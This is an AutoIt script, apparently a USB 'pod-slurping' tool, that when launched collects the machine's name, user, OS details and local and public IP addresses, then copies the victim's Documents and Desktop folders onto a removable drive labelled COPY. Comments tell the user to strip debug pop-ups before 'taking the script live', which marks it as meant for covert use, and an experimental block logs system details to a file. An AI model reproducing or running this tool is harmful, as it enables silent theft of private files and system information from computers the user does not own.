#cs
Author: squ1r3ll
Script Function: Automated Escape Drive; plug in a pen drive, launch the exe, get data.
			     ### Remove all data within ;DEBUG tags when taking the script live!###
#ce

;includes all of the things
#include <File.au3>
#include <Array.au3>
#include <Misc.au3>
#include <Inet.au3>

;creates all of the variables
Local $cpuarch = @CPUArch
Local $osarch = @OSArch
local $osversion = @OSVersion
Local $compname = @ComputerName
Local $loggedinuser = @UserName
Local $IP1 = @IPAddress1
Local $IP2 = @IPAddress2
Local $IP3 = @IPAddress3
Local $IP4 = @IPAddress4
Local $PubIP =_GetIP()
local $PCid = $compname & " - " & $loggedinuser
MsgBox(0, "" , $PCid)

Global $drive_arr = DriveGetDrive("REMOVABLE") ;find the removeble drives

   For $i = 0 to $drive_arr[0] 
	  If DriveGetLabel($drive_arr[$i]) = "COPY" Then
		 Global $drive_letter = $drive_arr[$i]
		 ;DEBUG
		 MsgBox(0, "" , $drive_letter) ;output drive letter
		 ;/DEBUG
	  EndIf
   Next

local $CopyDriveSpace = DriveSpaceFree($drive_letter)
;DEBUG
MsgBox(0 , "" , "Space Free: " & $CopyDriveSpace & " MB")
;/DEBUG

Local $size = DirGetSize(@DocumentsCommonDir) ;finds the size of my docs
	  $size = $size + DirGetSize(@DesktopCommonDir) ;finds the size of the desktop, adds to previous size, creating total copy size
	  
Local $docsdir = ($drive_letter & "\" & $PCid & "\documents\") ;specifies the directory to copy my docs to
;DEBUG
MsgBox(0 , "Docs Dir = " , $docsdir)
;/DEBUG
DirCreate($docsdir)

Local $deskdir = ($drive_letter & "\" & $PCid & "\desktop\") ;specifies the directory to copy desktop to
;DEBUG
MsgBox(0 , "Desktop Dir = " , $docsdir)
;/DEBUG
DirCreate($deskdir)

;#############################################################################################

;EXPERIMENTAL - WRITES A BUNCH OF INFO ABOUT THE SYSTEM TO A FILE ON THE COPY DRIVE

#cs Global $sFile = "0"
Global $sFilename = "INFO" & $sFile & ".txt" ;MAKE THIS FILEPATH POINT TO THE SAME DRIVE AS IDENTIFIED ABOVE

createfile()
writefile()

Func writefile()
    $file = FileOpen($sFilename, 1)
EndFunc

Func createfile()
    If(FileExists("INFO" & $sFile & ".txt")) Then
            $sFile = $sFile + "1"
            createfile()
        Else
            _FileCreate("INFO" & $sFile & ".txt")
    EndIf
EndFunc

Local $fileop = FileOpen("" & $sFile & ".txt", 1)
; Check if file opened for reading OK
If $fileop = -1 Then
    MsgBox(0, "Error", "Unable to open file.")
    Exit
 Else
   FileWriteLine($fileop, $cpuarch)
   FileWriteLine($fileop, $osarch & @CRLF)
   FileWriteLine($fileop, $osversion)
   FileWriteLine($fileop, $compname)
   FileWriteLine($fileop, $IP1)
   FileWriteLine($fileop, $PubIP)
   FileClose($fileop)
#ce EndIf

;#############################################################################################

If $size < $CopyDriveSpace Then ;actually copies over the data
	DirCopy(@MyDocumentsDir, $docsdir, 1) ;copies my documents
	DirCopy(@DesktopCommonDir, $deskdir, 1) ;copies the desktop (to see program shortcuts, could be interesting)
	MsgBox(0, "Success!", "Copy Successful!")
 Else
	MsgBox(0, "Fail!", "Copy Failed! IT'S JUST SO BIG!")
 EndIf